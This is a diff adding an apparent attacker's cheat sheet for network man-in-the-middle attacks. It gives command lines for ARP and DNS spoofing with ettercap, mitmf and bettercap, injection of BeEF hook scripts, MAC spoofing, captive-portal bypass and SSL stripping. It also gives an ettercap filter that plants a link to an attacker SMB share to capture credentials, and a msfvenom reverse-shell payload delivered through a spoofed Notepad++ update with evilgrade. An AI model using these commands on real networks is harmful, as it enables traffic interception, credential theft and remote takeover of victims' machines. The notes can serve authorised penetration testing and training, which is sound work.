@@ -1,0 +1,90 @@
+enable port-forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+sysctl -w net.ipv4.ip_forward = 1
+
+portfowarding
+iptables 
+
+mitm
+
+mitmf -i wlan0
+mitmf -i wlan0 -l 443 --replace
+	--inject --js-url http://127.0.0.1:3000/hook.js
+	--hsts
+	--spoof --arp --icmp --dhcp --dns --netmask <--gateway 192.168.1.x --targets 192.168.1.x,192.168.1.x>
+	--responder --analyze --wredir --nbtns --fingerprint --wpad --forcewpadauth
+	--smbauth
+	--smbtrap
+	--filepwn
+
+
+mac address impersonation
+ifconfig eth0 down
+ifconfig eth0 hw ether 00:01:02:03:04:05
+ifconfig eth0 up
+OR
+macchanger -m 00:01:02:03:04:05 eth0
+
+
+perl cpscam.pl <ethX> <ListenIP> <SubnetMask> <InactivityTimeout> <CaptiveLogoffURL>
+	-Bypass captive portals by impersonating inactive users
+
+yersinia -I
+loki.py
+	
+Ettercap
+ettercap -T -M arp:remote -F myfilter.ef // //
+ettercap -tqM arp:remote /vic.ti.m.ip/ /rem.ot.e.ip/
+	usage example: smb capture
+msf> use auxiliary/server/capture/smb
+smbcapture.ef
+if (ip.proto == TCP && tcp.src == 80) {
+	replace("<head>",
+		"<head> img src=\"\\\\at.atc.ker.ip\share\blank.jpg\">");
+}
+ettercap -TqP smb_down -M arp:remote -F smbcapture.ef // /at/atc/ker.ip/
+	usage example: evilgrade
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= 192.168.1.107 lport=443 -a x64 --smallest -f exe -o /root/isr-evilgrade/agent/agent.exe
+echo "notepad-plus.sourceforge.net A xx.xx.xx.xx" >> /etc/ettercap/etter.dns
+ettercap -TqM arp:remote // //
+p
+dns_spoof
+msf>use exploit/multi/handler
+evilgrade
+evilgrade>conf notepadplus
+evilgrade(notepadplus)>show options
+evilgrade(notepadplus)>start
+	Filter verbs
+replace(what,with):
+search(where,what):
+regex(where,regex):
+drop():
+inject(filename):
+kill()
+exec(command):
+exit():
+	ncurses input
+q	-quit
+c	-connections list
+p	-list available plugins
+	/usr/local/share/ettercap
+
+	
+BETTERCAP
+bettercap -i wlan0 -T 192.168.1.111 -S -X --sniffer-output out.pcap --proxy-https --proxy-pem cert.pem --proxy-module --js-url "http://192.168.1.147:3000/hook.js" --httpd --httpd-port 8000 --httpd-path /var/www/html
+	
+	
+SSLSTRIP
+	*note: use ssltrip2/sslstrip+ for hsts bypass
+echo "1" > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+sslstrip -l 8080
+ettercap -TqM arp:remote // //
+tail -f `locate ssltrip.log`
+	OR
+ettercap -TqM arp:remote -P sslstrip // //
+
+cain.exe
+
+
+
